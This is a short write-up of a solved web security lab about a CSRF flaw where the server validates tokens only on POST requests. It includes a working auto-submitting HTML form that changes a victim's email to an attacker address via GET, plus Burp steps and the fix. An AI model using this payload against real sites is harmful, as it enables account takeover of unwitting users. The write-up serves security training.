# Lab 2: CSRF Token Validation Depends on Request Method
**Difficulty:** Practitioner  
**Status:** ✅ Solved

## Vulnerability
Server only validates CSRF token on POST requests.
GET requests bypass token validation entirely.

## Exploit
```html

<form action="https://TARGET/my-account/change-email">
    <input type="hidden" name="email" value="attacker@gmail.com">
</form>
<script>
    document.forms[0].submit();
</script>
```
Steps

Intercepted email change POST request in Burp
Changed token value → rejected
Used "Change request method" in Burp → converted to GET
Observed token no longer validated on GET
Crafted GET form (no method="POST")
Delivered to victim → solved

Why It Works
Developer only added token validation for POST.
GET requests hit the same endpoint unprotected.
Fix
Validate CSRF tokens on ALL request methods.
